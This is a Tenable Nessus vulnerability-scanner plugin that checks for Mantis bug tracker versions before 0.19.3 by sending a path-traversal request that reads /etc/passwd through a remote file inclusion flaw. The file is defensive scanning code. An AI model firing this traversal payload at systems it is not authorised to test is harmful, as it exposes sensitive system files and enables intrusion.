#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(20093);
  script_version("1.21");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id(
    "CVE-2005-3091",
    "CVE-2005-3335",
    "CVE-2005-3336",
    "CVE-2005-3337",
    "CVE-2005-3338",
    "CVE-2005-3339"
  );
  script_bugtraq_id(15210, 15212, 15227);

  script_name(english:"Mantis < 0.19.3 Multiple Vulnerabilities");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple flaws.");
  script_set_attribute(attribute:"description", value:
"The remote version of Mantis suffers from a remote file inclusion
vulnerability.  Provided PHP's 'register_globals' setting is enabled, An
attacker may be able to leverage this issue to read arbitrary files on
the local host or to execute arbitrary PHP code, possibly taken from
third-party hosts. 

In addition, the installed version reportedly may be prone to SQL
injection, cross-site scripting, and information disclosure attacks.");
  script_set_attribute(attribute:"see_also", value:"http://secunia.com/secunia_research/2005-46/advisory/");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Mantis 0.19.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/08/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/10/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mantisbt:mantisbt");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2022 Tenable Network Security, Inc.");

  script_dependencies("mantis_detect.nasl");
  script_require_keys("installed_sw/MantisBT");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("install_func.inc");

port = get_http_port(default:80, embedded:TRUE);
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);
if (!can_host_php(port:port))
  audit(AUDIT_WRONG_WEB_SERVER, port, "one that supports PHP.");

app_name = "MantisBT";

install = get_single_install(app_name: app_name, port: port);
install_url = build_url(port:port, qs:install['path']);
dir = install['path'];

req = http_get (
  item: dir + "/bug_sponsorship_list_view_inc.php?t_core_path=../../../../../../../../../../etc/passwd%00",
  port:port
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if(res == NULL) audit(AUDIT_RESP_NOT, port, "a keepalive request");

if (
  egrep(pattern:"root:.*:0:[01]:", string:res) ||
  egrep(pattern:"Warning.+main\(/etc/passwd.+failed to open stream", string:res) ||
  egrep(pattern:"Failed opening .*'/etc/passwd", string:res)
)
{
  set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
  set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
  security_warning(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app_name, install_url);
